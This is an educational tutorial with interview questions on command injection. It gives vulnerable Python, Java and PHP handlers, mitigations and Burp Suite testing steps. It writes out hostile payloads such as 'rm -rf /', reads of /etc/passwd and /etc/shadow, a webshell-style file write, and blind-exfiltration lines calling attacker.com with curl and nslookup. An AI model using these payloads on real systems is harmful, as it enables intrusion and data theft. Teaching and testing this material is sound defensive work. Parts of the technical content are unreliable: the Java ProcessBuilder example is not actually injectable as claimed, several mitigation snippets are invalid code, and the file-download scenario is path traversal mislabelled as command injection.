### Explanation of Command Injection Vulnerabilities

**Command Injection** is a security vulnerability that allows an attacker to execute arbitrary system commands on a server by injecting malicious input into an application that passes untrusted data to a system shell or command execution function. This occurs when user input is improperly sanitized or validated before being used in functions that interact with the operating system, enabling attackers to manipulate the command being executed.

<br> here--> "**arbitrary command**" or "**arbitrary code execution**" (ACE) refers to a vulnerability that allows an attacker to run any code they choose on a target system, effectively gaining unauthorized control.


For example, if an application constructs a command like `ping [user_input]` and the user inputs `127.0.0.1 && rm -rf /`, the malicious command `rm -rf /` could execute, potentially deleting critical files.

### Two UI Scenarios Demonstrating Command Injection

1. **Scenario 1: Network Diagnostic Tool**
   - **Description**: A web application provides a network diagnostic tool where users enter an IP address to ping a server. The backend constructs a command like `ping -c 4 [user_input]` without sanitizing the input. An attacker enters `127.0.0.1 && cat /etc/passwd` in the input field.
   - **User Interaction**: The user submits the malicious input via a web form. The server executes the command, appending the output of `cat /etc/passwd` to the ping results, exposing sensitive data.
   - **Outcome**: The attacker gains access to the `/etc/passwd` file, potentially exposing user account details.

2. **Scenario 2: File Download Feature**
   - **Description**: An application allows users to download files by entering a filename in a form, which is passed to a command like `cat [user_input]`. An attacker inputs `../../etc/shadow` to access a restricted system file.
   - **User Interaction**: The user submits the malicious filename through the UI. The server executes `cat ../../etc/shadow`, returning the file’s contents to the attacker.
   - **Outcome**: The attacker retrieves sensitive system files, potentially compromising the server.

---

### Impact of Command Injection Vulnerabilities

- **Arbitrary Code Execution**: Attackers can execute any system command, such as installing malware or creating backdoors.
- **Data Exposure**: Access to sensitive files (e.g., `/etc/passwd`, configuration files) can leak user credentials or system details.
- **System Compromise**: Attackers can delete files, modify configurations, or gain full control of the server.
- **Privilege Escalation**: If the application runs with elevated privileges, attackers can execute commands as root or another high-privilege user.
- **Business Impact**: Data breaches, service disruptions, regulatory fines (e.g., GDPR), and reputational damage.

### Finding Command Injection Vulnerabilities in Source Code

To identify command injection vulnerabilities in source code, look for the following:

1. **Use of System Command Functions**:
   - Identify functions that execute system commands, such as `system()`, `exec()`, `shell_exec()`, `popen()`, or `ProcessBuilder` in various languages.
   - Check if these functions use user input directly or with insufficient sanitization.

2. **String Concatenation in Commands**:
   - Look for commands constructed by concatenating user input into strings (e.g., `system("ping " + user_input)`).
   - Verify if the input is sanitized or validated before use.

3. **Lack of Input Validation**:
   - Check if user input is validated against a whitelist of allowed values or characters.
   - Look for missing or weak sanitization that allows special characters like `;`, `&&`, `||`, or `>`.

4. **Dynamic Command Construction**:
   - Identify code that dynamically builds commands using user input without using safe APIs or parameterized interfaces.

**Tips for Source Code Review**:
- Search for keywords like `system`, `exec`, `shell`, `cmd`, `run`, or `process` to locate command execution functions.
- Check for input validation functions (e.g., regex, whitelists) before commands are executed.
- Look for user inputs (e.g., `request.getParameter`, `$_POST`, `request.form`) passed to command execution functions.
- Use static analysis tools (e.g., SonarQube, Fortify, Checkmarx) to flag potential command injection vulnerabilities.
- Review error-handling code to ensure it doesn’t expose command outputs to attackers.

### Command Injection in Three Different Languages with Scenarios

Below are three code snippets in different languages, each demonstrating a command injection vulnerability in a unique scenario, with explanations of why they are vulnerable and how to mitigate them.

#### 1. **Python (Flask) - Network Ping Tool**
**Scenario**: A Flask application allows users to ping an IP address via a web form. The input is directly used in a `subprocess.run` call, allowing command injection.

```python
from flask import Flask, request
import subprocess

app = Flask(__name__)

@app.route('/ping', methods=['POST'])
def ping():
    ip = request.form.get('ip')
    # Vulnerable: User input directly used in command
    result = subprocess.run(f'ping -c 4 {ip}', shell=True, capture_output=True, text=True)
    return result.stdout
```

**Why It’s Vulnerable**:
- The `ip` parameter is directly concatenated into the command string passed to `subprocess.run` with `shell=True`.
- No input validation is performed, allowing attackers to inject commands like `127.0.0.1 && cat /etc/passwd`.
- The `shell=True` option enables shell expansion, interpreting special characters like `&&`, `;`, or `|`.

**How to Mitigate**:
- Validate input against a whitelist (e.g., IP address regex).
- Avoid `shell=True` and use a list of arguments with `subprocess.run`:
  ```python
  import re
  ip = request.form.get('ip')
  if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', ip):
      return "Invalid IP address", 400
  result = subprocess.run(['ping', '-c', '4', ip], capture_output=True, text=True)
  ```
- Sanitize input to remove or escape dangerous characters.
- Run commands with least privilege (e.g., non-root user).

#### 2. **Java (Spring) - File Listing**
**Scenario**: A Spring application allows users to list directory contents by entering a path. The input is passed to `ProcessBuilder` without validation, enabling command injection.

```java
package com.example.demo;

import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

import java.io.BufferedReader;
import java.io.InputStreamReader;

@RestController
public class FileController {
    @PostMapping("/list_files")
    public String listFiles(@RequestParam String path) {
        try {
            // Vulnerable: User input used in command
            Process process = new ProcessBuilder("ls", path).start();
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
            return output.toString();
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }
}
```

**Why It’s Vulnerable**:
- The `path` parameter is directly passed to `ProcessBuilder` without validation.
- Attackers can input malicious paths like `; rm -rf /` to execute arbitrary commands.
- No sanitization or whitelisting restricts the input to valid directory paths.

**How to Mitigate**:
- Validate input against a whitelist of allowed directories:
  ```java
  String[] allowedPaths = {"/var/data", "/tmp"};
  if (!Arrays.asList(allowedPaths).contains(path)) {
      return "Invalid path", HttpStatus.BAD_REQUEST;
  }
  ```
- Use `ProcessBuilder` with a fixed command and validated arguments:
  ```java
  Process process = new ProcessBuilder("ls", "--", path).start();
  ```
- Avoid passing user input directly to command arguments.
- Run the process with minimal permissions using a sandbox or restricted user.

#### 3. **PHP (Laravel) - System Command Execution**
**Scenario**: A Laravel application allows users to run a custom script by providing a script name. The input is passed to `shell_exec` without sanitization, allowing command injection.

```php
<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;

class ScriptController extends Controller
{
    public function runScript(Request $request)
    {
        $script = $request->input('script');
        // Vulnerable: User input used in shell_exec
        $output = shell_exec("bash scripts/{$script}");
        return $output ?: "Script executed";
    }
}
?>
```

**Why It’s Vulnerable**:
- The `script` input is directly embedded in the `shell_exec` command.
- No validation ensures the input is a valid script name, allowing inputs like `script.sh; whoami` to execute additional commands.
- The use of `shell_exec` interprets the input in a shell context, enabling command chaining.

**How to Mitigate**:
- Validate input against a whitelist of allowed script names:
  ```php
  $allowedScripts = ['script1.sh', 'script2.sh'];
  if (!in_array($script, $allowedScripts)) {
      return response()->json(['error' => 'Invalid script'], 400);
  }
  ```
- Use `escapeshellarg` to sanitize input if dynamic arguments are needed:
  ```php
  $script = escapeshellarg($script);
  $output = shell_exec("bash scripts/{$script}");
  ```
- Avoid `shell_exec` and use safer alternatives like executing predefined scripts with fixed parameters.
- Run scripts in a restricted environment (e.g., Docker container, chroot jail).

### Finding Command Injection Vulnerabilities Using DAST

Dynamic Application Security Testing (DAST) can help identify command injection vulnerabilities by simulating malicious inputs. Here’s how to do it:

1. **Identify Input Points**:
   - Use tools like Burp Suite or OWASP ZAP to map forms, API endpoints, or URL parameters that accept user input (e.g., IP addresses, filenames, or commands).

2. **Inject Malicious Payloads**:
   - Submit payloads designed to execute additional commands, such as `; whoami`, `&& cat /etc/passwd`, `| ls`, or `$(whoami)`.
   - Example: In a form field for an IP address, input `127.0.0.1 && whoami`.

3. **Test Command Separators**:
   - Try special characters like `;`, `&&`, `||`, `>`, `<`, or backticks (`) to break out of the intended command.
   - Example: Input `127.0.0.1; ls -la` to check if the server executes `ls -la`.

4. **Analyze Responses**:
   - Look for unexpected output, such as system command results (e.g., directory listings, user info).
   - Check for error messages that reveal command execution details (e.g., shell errors).
   - Monitor response times for time-based payloads (e.g., `; sleep 10`).

5. **Automate with DAST Tools**:
   - Use Burp Suite’s Intruder or OWASP ZAP’s Fuzzer to send payloads like `; whoami`, `&& cat /etc/passwd`, or `| id`.
   - Configure tools to detect anomalies in responses, such as unexpected content or status codes.

6. **Test with Different Contexts**:
   - Test inputs in various fields (e.g., forms, headers, query parameters) to identify all vulnerable endpoints.
   - Use authenticated sessions to check if privileged commands can be executed.

**Example DAST Workflow with Burp Suite**:
- **Step 1**: Use Burp’s Spider to identify input fields and endpoints.
- **Step 2**: Intercept a form submission and use Intruder to inject payloads like `; whoami`, `&& ls`, or `| cat /etc/passwd`.
- **Step 3**: Analyze responses for signs of command execution (e.g., file contents, user info).
- **Step 4**: Validate findings by manually testing payloads in a browser or with cURL.
- **Step 5**: Test with different user roles to assess privilege escalation risks.

**Challenges in DAST for Command Injection**:
- Automated tools may miss subtle vulnerabilities if payloads don’t trigger detectable output.
- Blind command injection (no output returned) requires time-based or out-of-band testing (e.g., `ping attacker.com`).
- Manual testing is often needed to craft context-specific payloads.

### Mitigation of Command Injection Vulnerabilities

1. **Avoid System Commands**:
   - Use library functions or APIs instead of shell commands (e.g., use Python’s `socket` for pinging instead of `ping`).
   - Example: Replace `subprocess.run('ping ...')` with a native ping implementation.

2. **Input Validation**:
   - Validate user input against a strict whitelist of allowed values (e.g., IP addresses, filenames).
   - Use regex or predefined lists to restrict input to safe characters.

3. **Sanitize Input**:
   - Escape special characters using functions like `escapeshellarg` (PHP) or `shlex.quote` (Python).
   - Example in PHP: `$input = escapeshellarg($input);`.

4. **Use Safe APIs**:
   - Pass arguments as arrays to command execution functions to avoid shell interpretation.
   - Example in Python: `subprocess.run(['ls', path], shell=False)`.

5. **Least Privilege Principle**:
   - Run the application and commands with minimal permissions (e.g., non-root user, restricted environment).
   - Use sandboxing techniques like Docker or chroot jails.

6. **Security Testing**:
   - Regularly test for command injection using SAST and DAST tools.
   - Conduct manual penetration testing to identify complex vulnerabilities.

7. **Logging and Monitoring**:
   - Log all command executions and monitor for suspicious patterns.
   - Implement alerts for unexpected commands or errors.

- **Definition**: Allows attackers to execute arbitrary system commands via unsanitized user input.
- **Attack Vector**: Malicious input in forms, URLs, or APIs passed to command execution functions.
- **Key Indicator**: Use of `system`, `exec`, or similar functions with unvalidated input.
- **Prevention**: Validate input, avoid shell commands, use safe APIs, and run with least privilege.
- **Impact**: System compromise, data exposure, or privilege escalation.
- **Testing**: Use DAST tools to inject payloads like `; whoami` and check responses.

### Top Advanced Interview Questions on Command Injection

1. **Question**: How can an attacker exploit a blind command injection vulnerability, and what techniques can be used to detect it?

   **Answer**: **Exploitation**:
   - In blind command injection, the application does not return command output, but the command executes.
   - Attackers use payloads like `; ping attacker.com` or `; curl http://attacker.com/log` to send data to an external server they control.
   - Time-based payloads like `; sleep 10` can confirm execution by delaying the response.
   **Detection**:
   - Use DAST tools to inject time-based payloads (e.g., `sleep 10`) and measure response times.
   - Set up an external server to capture out-of-band requests (e.g., DNS or HTTP requests).
   - Monitor server logs for unexpected command executions or errors.
   - Manually test with payloads like `; nslookup attacker.com` to trigger DNS requests.

2. **Question**: How would you secure a legacy application that relies heavily on system commands without rewriting it entirely?

   **Answer**: Securing a legacy application requires:
   - **Input Validation**: Implement strict whitelisting for all user inputs (e.g., regex for filenames, IPs).
   - **Sanitization**: Use language-specific escaping functions (e.g., `escapeshellarg` in PHP).
   - **Safe Command Execution**: Modify commands to use argument arrays instead of string concatenation (e.g., `system(['ls', $path])`).
   - **Sandboxing**: Run commands in a restricted environment (e.g., Docker, chroot) with minimal permissions.
   - **Logging**: Log all command executions to detect and respond to malicious attempts.
   - **Incremental Refactoring**: Gradually replace system commands with safer APIs while maintaining functionality.

3. **Question**: How can command injection vulnerabilities in a microservices architecture be mitigated, especially when services execute system commands?

   **Answer**: **Mitigation**:
   - **Centralized Input Validation**: Implement input validation at the API gateway or shared library level to sanitize inputs across services.
   - **Avoid Shell Commands**: Use service-specific APIs or libraries instead of shell commands (e.g., use a file API instead of `ls`).
   - **Secure Communication**: Validate inter-service inputs to prevent injected commands from upstream services.
   - **Sandboxing**: Run each microservice in a container with restricted permissions and no shell access.
   - **Monitoring**: Log and monitor command executions across services using a centralized logging system.
   - **DAST Testing**: Test each service for command injection using tools like Burp Suite with service-specific payloads.

4. **Question**: What are the risks of command injection in a cloud-based application, and how can cloud-specific features mitigate them?

   **Answer**: **Risks**:
   - Cloud applications may run with elevated permissions, amplifying the impact of command injection (e.g., accessing cloud storage or secrets).
   - Compromised services can affect other cloud resources (e.g., EC2 instances, S3 buckets).
   - Attackers can exploit misconfigured IAM roles to escalate privileges.
   **Mitigation**:
   - Use cloud-native APIs (e.g., AWS SDK) instead of shell commands to interact with services.
   - Implement strict IAM roles with least privilege for each service or function.
   - Use serverless architectures (e.g., AWS Lambda) to limit command execution capabilities.
   - Enable cloud monitoring (e.g., AWS CloudTrail) to detect unauthorized command executions.
   - Validate inputs using cloud-native security tools like AWS WAF.

5. **Question**: How can attackers chain command injection with other vulnerabilities to increase impact, and how can this be prevented?

   **Answer**: **Chaining**:
   - **With XSS**: Use command injection to write malicious scripts to a file, then trigger XSS to execute them in users’ browsers.
   - **With File Inclusion**: Inject commands to create or modify files, then exploit local file inclusion to execute them.
   - **With Privilege Escalation**: Use command injection to modify system files (e.g., `/etc/passwd`) to gain higher privileges.
   - Example: Inject `; echo 'malicious_script' > /var/www/html/script.php` to create a backdoor.
   **Prevention**:
   - Validate and sanitize all inputs to prevent command injection.
   - Use safe APIs and avoid shell commands.
   - Implement strict file permissions to prevent unauthorized writes.
   - Use WAF and intrusion detection systems to block malicious inputs.
   - Conduct regular security testing to identify and patch chained vulnerabilities.
